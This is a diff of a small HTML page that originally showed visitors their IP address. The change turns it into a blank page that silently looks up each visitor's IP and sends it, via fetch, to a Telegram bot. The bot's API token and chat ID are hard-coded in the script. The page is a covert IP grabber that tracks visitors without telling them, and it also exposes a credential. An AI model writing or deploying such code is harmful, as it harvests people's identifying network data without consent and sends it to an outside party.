@@ -1,23 +1,20 @@
 <!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8" />
-  <title>Ваш IP</title>
-</head>
+<html>
+<head><title>IP в Telegram</title></head>
 <body>
-  <h1>Ваш IP адрес</h1>
-  <p id="ip">Загрузка...</p>
+<script>
+const token = '8083604701:AAHVEEUxRHT9MiQU7RVtMPIlFgWo3tR7PCU';
+const chat_id = '6945488830';  // вставь сюда свой chat_id
 
-  <script>
-    // Получение IP через публичный API https://api.ipify.org
-    fetch('https://api.ipify.org?format=json')
-      .then(response => response.json())
-      .then(data => {
-        document.getElementById('ip').textContent = data.ip;
-      })
-      .catch(() => {
-        document.getElementById('ip').textContent = 'Не удалось определить IP';
-      });
-  </script>
+fetch('https://api.ipify.org?format=json')
+  .then(resp => resp.json())
+  .then(data => {
+    const ip = data.ip;
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=IP пользователя: ${ip}`;
+    return fetch(url);
+  })
+  .then(() => console.log('IP отправлен в Telegram'))
+  .catch(console.error);
+</script>
 </body>
 </html>
